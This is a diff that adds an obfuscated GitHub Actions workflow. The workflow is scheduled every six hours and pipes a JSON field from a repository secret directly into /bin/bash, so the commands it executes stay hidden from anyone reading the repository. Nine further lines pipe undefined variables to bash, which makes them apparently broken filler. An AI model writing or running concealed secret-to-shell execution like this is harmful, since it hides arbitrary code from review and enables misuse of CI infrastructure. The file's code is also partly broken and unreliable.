@@ -1,0 +1,27 @@
+name: quansuozhiyaoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quansuozhiyaoo
+        env:
+          qoc279: ${{ secrets.qoc279 }}
+        run: |
+          echo $qoc279 | jq -r .ae17871 | /bin/bash
+          echo $cjnz54 | jq -r .qdpna610 | /bin/bash
+          echo $zv442 | jq -r .adv072 | /bin/bash
+          echo $sylpr97 | jq -r .om95 | /bin/bash
+          echo $flzu95504 | jq -r .f76 | /bin/bash
+          echo $fdkf720 | jq -r .bo7 | /bin/bash
+          echo $b2 | jq -r .yxdci67 | /bin/bash
+          echo $mn533 | jq -r .nkqx40 | /bin/bash
+          echo $izd37144 | jq -r .v06729 | /bin/bash
+          echo $ltvz734 | jq -r .dva13734 | /bin/bash
+
